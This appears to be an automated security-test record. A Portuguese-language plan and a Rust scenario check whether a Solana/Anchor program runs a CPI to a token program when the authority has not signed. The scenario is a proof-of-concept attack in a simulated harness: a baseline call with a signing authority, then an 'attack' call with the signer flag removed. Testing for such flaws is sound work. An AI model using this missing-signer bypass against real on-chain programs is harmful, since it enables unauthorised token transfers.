{
  "plan": "O programa-alvo apenas constroi uma CPI para o token_program passado como AccountInfo, sem validar is_signer da authority. O baseline usa o proprio program_id como token_program (que aceita qualquer instrucao) e uma authority que assina, provando que a CPI e executada. O ataque repete a mesma chamada removendo a assinatura da authority; se o programa nao exigir is_signer, a CPI ainda sera construida e executada. O efeito mede que a operacao privilegiada ocorreu sem a assinatura da autoridade, observando que a conta authority nao assinou mas a instrucao teve sucesso.",
  "scenario": "let authority = Pubkey::new_unique();
let source = Pubkey::new_unique();
let destination = Pubkey::new_unique();

let source_acc = account(&env.program_id, &[], None);
let destination_acc = account(&env.program_id, &[], None);
let authority_acc = account(&env.program_id, &[], None);

let token_program = env.program_id;
let token_program_acc = program_account(&token_program);

let metas = vec![
    AccountMeta::new(source, false),
    AccountMeta::new(destination, false),
    AccountMeta::new_readonly(authority, true),
    AccountMeta::new_readonly(token_program, false),
];
let ix = env.anchor_ix("cpi", &(100u64,), metas);

let contas = vec![
    (source, source_acc.clone()),
    (destination, destination_acc.clone()),
    (authority, authority_acc.clone()),
    (token_program, token_program_acc.clone()),
];

let baseline = env.baseline("cpi legitima com authority signer", &ix, &contas);

let metas_ataque = vec![
    AccountMeta::new(source, false),
    AccountMeta::new(destination, false),
    AccountMeta::new_readonly(authority, false),
    AccountMeta::new_readonly(token_program, false),
];
let ix_ataque = env.anchor_ix("cpi", &(100u64,), metas_ataque);

let r = env.attack("cpi sem assinatura da authority", &ix_ataque, &contas);
if r.program_result == ProgramResult::Success {
    env.effect("CPI executada sem a assinatura da authority", true);
}"
}

